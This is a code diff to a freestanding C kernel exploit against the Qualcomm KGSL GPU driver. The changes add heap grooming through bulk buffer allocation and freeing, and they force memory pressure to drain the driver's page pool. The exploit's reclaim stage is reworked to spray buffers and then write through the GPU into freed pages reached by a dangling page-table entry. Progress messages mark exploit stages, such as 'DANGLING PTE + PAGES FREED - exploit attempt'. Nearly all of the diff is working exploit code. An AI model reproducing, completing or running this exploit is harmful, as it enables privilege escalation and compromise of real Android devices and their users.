@@ -85,6 +85,8 @@ static u32 g_hold[4096]; static int g_hold_n;
 static u64 g_hoglen;
 static int g_round;
 #define REGIONS 1024
+#define POOLFILL 2048
+static u32 g_pf_bids[POOLFILL]; static int g_pf_n;
 
 static long alloc_buf(u64 size,u32 flags,u32*id,u64*gpu,u32**cpu){
     struct kgsl_gpumem_alloc_id a; for(u64 i=0;i<sizeof(a);i++)((u8*)&a)[i]=0;
@@ -184,6 +186,11 @@ void _start(void){
     if(alloc_buf(0x1000,0,&g_cmdid,&g_cmd_gpu,&g_cmd)){out("[!] cmd\n");sys3(SYS_exit,1,0,0);return;}
     if(alloc_buf(0x1000,0,&g_outid,&g_out_gpu,&g_out)){out("[!] out\n");sys3(SYS_exit,1,0,0);return;}
     for(int i=0;i<64;i++) g_out[i]=0; dc_civac(g_out,256);
+    for(int q=0;q<POOLFILL;q++){ u32 id; u64 gpu; u32*cp;
+        if(alloc_buf(ASZ,0,&id,&gpu,&cp)) break;
+        g_pf_bids[g_pf_n++]=id;
+    }
+    out("[*] poolfill=");outdec(g_pf_n);out("\n");
         int wins=0;
     for(int round=1; round<=ROUNDS; round++){
         if(alloc_a()) break;
@@ -284,84 +291,52 @@ void _start(void){
                     for(u64 q=0;q<g_fsz/4;q++) pm[q]=0xA5A5A5A5u; dc_civac(pm,g_fsz);
                     sys2(SYS_munmap,(s64)g_p_res,g_fsz);
                     sys2(SYS_munmap,(s64)g_h1,0x1000);
+                    /* flavor shaper: bulk-free held bufs (keeps the pk=1 dangling
+                       sub-flavor frequent; pages enter the unbounded kgsl pool tail) */
+                    for(int q=0;q<g_pf_n;q++){ struct kgsl_gpumem_free_id bf; bf.id=g_pf_bids[q]; bf.pad=0; sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&bf); }
+                    g_pf_n=0;
+                    /* pressure touch: cross the watermark -> kswapd/shrink_slab ->
+                       kgsl_pool_shrinker drains the pool to the buddy, so the entry
+                       pages land at the HEAD of the now-empty pool */
+                    s64 pr=sys6(SYS_mmap,0,0x1000000,3,0x22,-1,0);
+                    if(pr>0){ for(u64 q=0;q<0x1000000;q+=0x1000) ((volatile u8*)(pr+q))[0]=0; }
                     struct kgsl_gpumem_free_id f4; f4.id=g_aid; f4.pad=0;
                     sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&f4);
-                    /* reclaim window: allocate PTE regions IMMEDIATELY after the free */
-                    int nr2=0;
-                    for(int q=0;q<32;q++){
-                        s64 r=sys6(SYS_mmap,0,0x10000,3,0x22,-1,0);
-                        if(r<=0) break;
-                        ((volatile u32*)r)[0]=0x4D414700u+(u32)q;
-                        ((volatile u32*)(r+0x1000))[0]=0x4D414900u+(u32)q;
-                        if(nr2<4096) g_regs[nr2++]=(u64)r;
-                    }
-                    out("[R");outdec(round);out("] early regions=");outdec(nr2);out("\n");
                     int dang=probe_mask(1,(u64)g_p_res+0x100,0xA5A5A5A5u,0xFFFFFFFFu,300);
                     out("[R");outdec(round);out("] post-destroy dangling=");outdec(dang);out("\n");
                     if(dang==1){
                         out("[R");outdec(round);out("] DANGLING PTE + PAGES FREED - exploit attempt\n");
-                        s64 rsv=sys6(SYS_mmap,0,0x10000000,0,0x22,-1,0);
-                        int nwin=0;
-                        if(rsv>0){
-                            for(int i=0;i<128;i++){
-                                s64 a=rsv+(s64)i*0x200000;
-                                s64 r=sys6(SYS_mmap,a,0x1000,3,0x32,-1,0);
-                                if(r!=a) break;
-                                ((volatile u8*)a)[0]=0x5A;
-                                nwin++;
-                            }
+                        g_nb=0;
+                        for(int q=0;q<512;q++){ u32 id; u64 gpu; u32*cp;
+                            if(alloc_buf(ASZ,0,&id,&gpu,&cp)) break;
+                            for(u64 w2=0;w2<ASZ/4;w2++) cp[w2]=0xB6B6B6B6u; dc_civac(cp,ASZ);
+                            if(g_nb<MAXB){ g_bids[g_nb]=id; g_bgpu[g_nb]=gpu; g_bcpu[g_nb]=cp; g_nb++; }
                         }
-                        out("[R");outdec(round);out("] aligned windows=");outdec(nwin);out("\n");
-                        int hp=-1;
-                        for(int o=0;o<3;o++){
-                            int c=probe_mask(1,(u64)g_p_res+(u64)o*0x1000,0x3,0x3,300);
-                            out("[R");outdec(round);out("] pte-like@");outdec(o*0x1000);out("=");outdec(c);out("\n");
-                            if(c==1){ hp=o; break; }
-                        }
-                        if(hp>=0 && nwin>0){
-                            u64 base=(u64)g_p_res+(u64)hp*0x1000;
-                            u32 pte0=read_dword(3,base,400);
-                            out("[R");outdec(round);out("] PTE#0=");outhex(pte0);out("\n");
-                            int ww=gpu_write(2,base+8,pte0);
-                            out("[R");outdec(round);out("] wrote PTE#0 -> slot1 rc=");outdec(ww);out("\n");
-                            for(int i=0;i<nwin;i++){
-                                s64 a=rsv+(s64)i*0x200000;
-                                ((volatile u32*)a)[0]=0xCAFE0000u+(u32)i;
-                            }
-                            int hit=-1;
-                            for(int i=0;i<nwin;i++){
-                                s64 a=rsv+(s64)i*0x200000;
-                                int c=probe_mask(2,a+0x1000,0xCAFE0000u+(u32)i,0xFFFFFFFFu,120);
-                                if(c==1){ hit=i; break; }
-                            }
-                            out("[R");outdec(round);out("] ALIAS region=");outdec(hit);
-                            if(hit>=0){ out("  <== ARBITRARY PTE CONTROL PROVEN\n"); break; }
-                            else out("  (no alias)\n");
-                        } else {
-                            g_nb=0;
-                            for(int q=0;q<512;q++){ u32 id; u64 gpu; u32*cp;
-                                if(alloc_buf(ASZ,0,&id,&gpu,&cp)) break;
-                                for(u64 w2=0;w2<ASZ/4;w2++) cp[w2]=0xB6B6B6B6u; dc_civac(cp,ASZ);
-                                if(g_nb<MAXB){ g_bids[g_nb]=id; g_bgpu[g_nb]=gpu; g_bcpu[g_nb]=cp; g_nb++; }
-                            }
-                            int ra=probe(1,(u64)g_p_res+0x100,0xB6B6B6B6u);
-                            out("[R");outdec(round);out("] KGSL reclaim=");outdec(ra);
-                            if(ra==1){
-                                int w2=gpu_write(2,(u64)g_p_res+0x100,0xCAFEF00Du);
-                                int found=-1;
-                                for(int q=0;q<g_nb;q++){ u32*p=g_bcpu[q];
-                                    for(u64 w3=0;w3<ASZ/4;w3++){ if(p[w3]==0xCAFEF00Du){ found=q; break; } }
-                                    if(found>=0) break; }
-                                out(" gpu_write=");outdec(w2);out(" alias buf=");outdec(found);
-                                out(found>=0?"  <== GPU WRITE INTO RECLAIMED PAGE\n":"\n");
-                            } else out("\n");
-                        }
-                        if(rsv>0) sys2(SYS_munmap,(s64)rsv,0x10000000);
-                        for(int q=0;q<nr2;q++) sys2(SYS_munmap,(s64)g_regs[q],0x10000);
+                        int ra=probe(1,(u64)g_p_res+0x100,0xB6B6B6B6u);
+                        out("[R");outdec(round);out("] KGSL reclaim=");outdec(ra);
+                        if(ra==1){
+                            int w2=gpu_write(2,(u64)g_p_res+0x100,0xCAFEF00Du);
+                            int found=-1;
+                            for(int q=0;q<g_nb;q++){ u32*p=g_bcpu[q];
+                                for(u64 w3=0;w3<ASZ/4;w3++){ if(p[w3]==0xCAFEF00Du){ found=q; break; } }
+                                if(found>=0) break; }
+                            out(" gpu_write=");outdec(w2);out(" alias buf=");outdec(found);
+                            out(found>=0?"  <== GPU WRITE INTO RECLAIMED PAGE\n":"\n");
+                        } else out("\n");
+                        if(pr>0) sys2(SYS_munmap,(s64)pr,0x1000000);
                         for(int q=0;q<g_nb;q++){ struct kgsl_gpumem_free_id bf; bf.id=g_bids[q]; bf.pad=0; sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&bf); }
                         g_nb=0;
+                        for(int q=0;q<POOLFILL;q++){ u32 id; u64 gpu; u32*cp;
+                            if(alloc_buf(ASZ,0,&id,&gpu,&cp)) break;
+                            g_pf_bids[g_pf_n++]=id;
+                        }
                         continue;
                     }
+                    for(int q=0;q<POOLFILL;q++){ u32 id; u64 gpu; u32*cp;
+                        if(alloc_buf(ASZ,0,&id,&gpu,&cp)) break;
+                        g_pf_bids[g_pf_n++]=id;
+                    }
+                    if(pr>0) sys2(SYS_munmap,(s64)pr,0x1000000);
                     continue;
                 }
                 sys2(SYS_munmap,(s64)g_h1,0x1000);
